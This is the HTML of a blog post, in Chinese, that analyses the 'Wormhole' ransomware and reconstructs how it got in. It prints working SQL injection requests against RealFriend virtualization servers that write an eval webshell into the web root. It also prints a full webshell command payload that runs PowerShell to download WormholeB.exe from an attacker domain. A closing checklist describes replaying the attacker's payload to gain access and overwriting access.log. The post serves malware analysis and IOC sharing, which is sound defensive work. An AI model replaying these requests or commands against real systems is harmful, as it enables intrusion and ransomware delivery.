@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="随便分析下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Wormhole Ransomware">
+<meta property="og:url" content="https://yoloyolo.top/2024/05/06/Wormhole-Ransomware/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="随便分析下">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-06T11:05:20.000Z">
+<meta property="article:modified_time" content="2024-05-06T11:08:18.598Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Malware">
+<meta property="article:tag" content="Reverse">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2024/05/06/Wormhole-Ransomware/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Wormhole Ransomware | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2024/05/06/Wormhole-Ransomware/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Wormhole Ransomware
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-05-06 19:05:20 / Modified: 19:08:18" itemprop="dateCreated datePublished" datetime="2024-05-06T19:05:20+08:00">2024-05-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Study/" itemprop="url" rel="index"><span itemprop="name">Study</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>随便分析下</p>
+<a id="more"></a>
+<h1 id="analysis"><a class="markdownIt-Anchor" href="#analysis"></a> Analysis</h1>
+<p>拿到样本之后丢IDA</p>
+<p>代码挺直白的，文件后缀白名单，服务名，进程名，卷影拷贝删除命令，加密公钥都明文写Main函数里面</p>
+<p>还有个bat文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start &#x2F;min deleteFile.bat</span><br></pre></td></tr></table></figure>
+<p>大概看了一下，应该是用来删除以下几个文件</p>
+<ul>
+<li>Wormhole.exe</li>
+<li>WormholeB.exe</li>
+<li>ruiyouabcd1234.php</li>
+<li>phpinfo.php</li>
+<li>logo-eoffice.php</li>
+</ul>
+<p>前两个大概率是勒索程序了<br />
+第三个猜测是Webshell<br />
+最后一个是泛微E-Office文件上传漏洞利用成功之后的Webshell文件名<br />
+应该是怕其他人利用这个漏洞拿权限，但是感觉没什么卵用<br />
+<s>Web根目录上都写了十几个马了</s></p>
+<p>沙箱行为只有加密文件，没有网络通信行为</p>
+<p>通过某种方法抓到了Webshell的内容</p>
+<p><code>1	abcd1234&lt;?php eval($_POST[&quot;LYYKtWSAQq6HsF3N&quot;]);?&gt;</code></p>
+<h1 id="攻击流程"><a class="markdownIt-Anchor" href="#攻击流程"></a> 攻击流程</h1>
+<p>整点非常规应急响应，根据日志以及魔改Webshell还原出如下攻击流程</p>
+<p>漏洞为瑞友天翼应用虚拟化系统的SQL注入漏洞，加上管理员权限运行就可以写入Webshell了</p>
+<p>受影响的版本为 5.x &lt;= Version &lt;= 7.0.2.1</p>
+<ol>
+<li>资产探测以及版本信息确认</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;RapAgent.xgi?CMD&#x3D;GetRegInfo HTTP&#x2F;1.1</span><br><span class="line">Host: [DATA EXPUNGED]</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.77 Safari&#x2F;537.36 Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>写入phpinfo以确认漏洞是否存在</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;AgentBoard.XGI?user&#x3D;-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5Cphpinfo.php%22+--+-&amp;cmd&#x3D;UserLogin HTTP&#x2F;1.1</span><br><span class="line">Host: [DATA EXPUNGED]</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.77 Safari&#x2F;537.36 Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>写入Webshell</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;AgentBoard.XGI?user&#x3D;-1%27+union+select+1%2C%27abcd1234%3C%3Fphp+eval%28%24_POST%5B%22LYYKtWSAQq6HsF3N%22%5D%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5Cruiyouabcd1234.php%22+--+-&amp;cmd&#x3D;UserLogin HTTP&#x2F;1.1</span><br><span class="line">Host: [DATA EXPUNGED]</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.77 Safari&#x2F;537.36 Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>执行命令</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;ruiyouabcd1234.php HTTP&#x2F;1.1</span><br><span class="line">Host: [DATA EXPUNGED]</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.77 Safari&#x2F;537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 5255</span><br><span class="line"></span><br><span class="line">LYYKtWSAQq6HsF3N&#x3D;%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.41c435%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%220a701%22.%221644b%22%3Becho%20%40asenc(%24output)%3Becho%20%229303%22.%2202044%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(substr(%24_POST%5B%22c2cf9b4c7b1194%22%5D%2C2))%3B%24s%3Dbase64_decode(substr(%24_POST%5B%22q489dad02f83c5%22%5D%2C2))%3B%24envstr%3D%40base64_decode(substr(%24_POST%5B%22ffc93031853f3%22%5D%2C2))%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map(&#39;trim&#39;%2Carray_map(&#39;strtolower&#39;%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe(&#39;putenv&#39;)%20%26%26%20(fe(&#39;error_log&#39;)%20%7C%7C%20fe(&#39;mail&#39;)))%20%7Bif%20(strstr(readlink(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20&#39;as&#39;)%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe(&#39;error_log&#39;))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe(&#39;system&#39;))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe(&#39;passthru&#39;))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe(&#39;shell_exec&#39;))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe(&#39;exec&#39;))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(join(%22%0A%22%2C%24o))%3B%7Delseif(fe(&#39;popen&#39;))%7B%24fp%3D%40popen(%24c%2C&#39;r&#39;)%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe(&#39;proc_open&#39;))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array(&#39;pipe&#39;%2C%20&#39;w&#39;)%2C%202%20%3D%3E%20array(&#39;pipe&#39;%2C%20&#39;w&#39;))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe(&#39;antsystem&#39;))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM(&#39;WScript.shell&#39;)%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&amp;c2cf9b4c7b1194&#x3D;H4Y21k&amp;ffc93031853f3&#x3D;se&amp;q489dad02f83c5&#x3D;3AY2QgL2QgIkM6L1Byb2dyYW0gRmlsZXMgKHg4NikvUmVhbEZyaWVuZC9SYXAgU2VydmVyL1dlYlJvb3QiJnBvd2Vyc2hlbGwgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIihOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHA6Ly93d3cucmc3N2U2NDJtdGNobTU4aC5jb20vV29ybWhvbGVCLmV4ZScsICdDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFJlYWxGcmllbmRcUmFwIFNlcnZlclxXZWJSb290XFdvcm1ob2xlQi5leGUnKTsgaWYgKCQ%2FKSB7IFdyaXRlLUhvc3QgJ1N1Y2Nlc3MnIH0iJmVjaG8gYzk5MzAzMmE1JmNkJmVjaG8gYzEwMGUxZWFl</span><br></pre></td></tr></table></figure>
+<p>执行命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;d &quot;C:&#x2F;Program Files (x86)&#x2F;RealFriend&#x2F;Rap Server&#x2F;WebRoot&quot;&amp;powershell -ExecutionPolicy Bypass -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;www.rg77e642mtchm58h.com&#x2F;WormholeB.exe&#39;, &#39;C:\Program Files (x86)\RealFriend\Rap Server\WebRoot\WormholeB.exe&#39;); if ($?) &#123; Write-Host &#39;Success&#39; &#125;&quot;&amp;echo c993032a5&amp;cd&amp;echo c100e1eae</span><br></pre></td></tr></table></figure>
+<p>失陷站点上存在<code>Wormhole.exe</code>，估计是早批次的命令执行的结果</p>
+<p>虽然下载了勒索程序，但是并没有直接执行，大概是在做进一步的内网渗透？</p>
+<h1 id="ransom"><a class="markdownIt-Anchor" href="#ransom"></a> Ransom</h1>
+<p>Public Key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqnJhs7S6xt+A0E&#x2F;xUcaO</span><br><span class="line">DcK&#x2F;R8LZoLKhsQYG9b&#x2F;uibVk&#x2F;4cfEFtGwdTnM3AZbDWKqEJL+L&#x2F;xt7J2AQzG3beS</span><br><span class="line">7vmRv0NyDDvrArf7QPl5i&#x2F;A9Gyl5Tr82G+shZwLDlLETCI8KgNSFvW6VgUDnKnCR</span><br><span class="line">xjqdYxa4Y80ud2q5FmlJA+KMmBYyQVVAaxgbR72LqTASf1E4FohGOa3&#x2F;DLAQbQqI</span><br><span class="line">7wOsudYKMKPmImZ7AxXe86mxRI3fjmUWRAddbkl&#x2F;GILWu5KidArG0a9EENVADh2g</span><br><span class="line">B0g3iGSzz9B&#x2F;erqAKG7Sd7s6i0TlVnUmj+FSs9lObKCCghrOBgLoWjMiYH2SSt4i</span><br><span class="line">XQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<p>Ransom Note</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Please contact us via Tox.chat tool or qtox tool</span><br><span class="line">Download Tox.chat https:&#x2F;&#x2F;tox.chat&#x2F;download.html </span><br><span class="line">Download qtox https:&#x2F;&#x2F;github.com&#x2F;qTox&#x2F;qTox&#x2F;blob&#x2F;master&#x2F;README.md#qtox </span><br><span class="line">If your chat Tool cannot connect to the Internet, please set up a proxy.</span><br><span class="line">Add our TOX ID and send an encrypted file and Wormhole ID for testing decryption.</span><br><span class="line"></span><br><span class="line">Our TOX ID 503313BA88174FDF187C5009A43B45CBC144D313EFBF98BB75BFA084B5743E3ECA94499F95ED</span><br><span class="line"></span><br><span class="line">Your Wormhole ID: aWtfpQoMkfi5reJ7kRi77kHpH0u+eu1vSD9VL86J0XC1s+FfWkWNG8MIk4ypSNj7</span><br><span class="line">v6PsXpbmq3OhPf84ctfZiQhqnwGHWjKpCKdvx1r9uQ7C5xty9tmQ1vl&#x2F;KeW0RfaI</span><br><span class="line">F&#x2F;4BGazwcg0ZJQTxMfqVRo+5lfFIeb1fCs0aZbpSE3mPMS6YBDLhRcTiKuvDPZ&#x2F;2</span><br><span class="line">My5YSkFK72&#x2F;YTZhjJ4I40TN&#x2F;k7ZBg1KS7WYjfMJlUJ16tI79VkyDD+BUU9dYAacE</span><br><span class="line">Nhb+OxQn7TB1LCOE&#x2F;gDEXdbpEi&#x2F;9evi0vCt&#x2F;ycPDP73wVknQGapkfZSPtI0Gup3e</span><br><span class="line">sYSpovrzOQyKng8wHIZTog&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p>勒索金额为0.023BTC，至少当时是</p>
+<h1 id="ioc"><a class="markdownIt-Anchor" href="#ioc"></a> IOC</h1>
+<ul>
+<li>80.78.24.254</li>
+<li><a target="_blank" rel="noopener" href="http://www.rg77e642mtchm58h.com">www.rg77e642mtchm58h.com</a></li>
+<li>dff3fd0197c5ea432f58f62a5f40dfa8e0cdc3ecca36bcf3221962349fbd9a22</li>
+<li>8b301ea74563e786042a59b4ac95bb4ef738fb8c7d71d1e5f3c6ce90dbfa1980</li>
+<li>53b576cb4af70f4610df30fbfd872f526d280fa65780dc23cd304463d34cd13f</li>
+</ul>
+<p>漏洞利用的IP，文件服务器域名，以及三个勒索程序</p>
+<hr />
+<h1 id="非常规应急响应"><a class="markdownIt-Anchor" href="#非常规应急响应"></a> 非常规应急响应</h1>
+<p>准备</p>
+<ul>
+<li>代理软件</li>
+<li>终端代理</li>
+</ul>
+<p>GetShell</p>
+<ul>
+<li>Payload重放</li>
+<li>已知Webshell</li>
+</ul>
+<p>信息收集</p>
+<ul>
+<li>他人遗留文件</li>
+<li>access.log，获得更多攻击行为</li>
+<li>Powershell记录</li>
+<li>修改他人Webshell，记录POST参数以获取更多攻击行为</li>
+</ul>
+<p>Cleaning</p>
+<ul>
+<li>删除自身遗留文件</li>
+<li>access.log覆写</li>
+<li>handle解除文件占用(管理员权限)</li>
+</ul>
+<p>EOF</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://yoloyolo.top/2024/05/06/Wormhole-Ransomware/" title="Wormhole Ransomware">https://yoloyolo.top/2024/05/06/Wormhole-Ransomware/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Malware/" rel="tag"># Malware</a>
+              <a href="/tags/Reverse/" rel="tag"># Reverse</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/03/28/Tellyouthepass/" rel="prev" title="Tellyouthepass">
+      <i class="fa fa-chevron-left"></i> Tellyouthepass
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
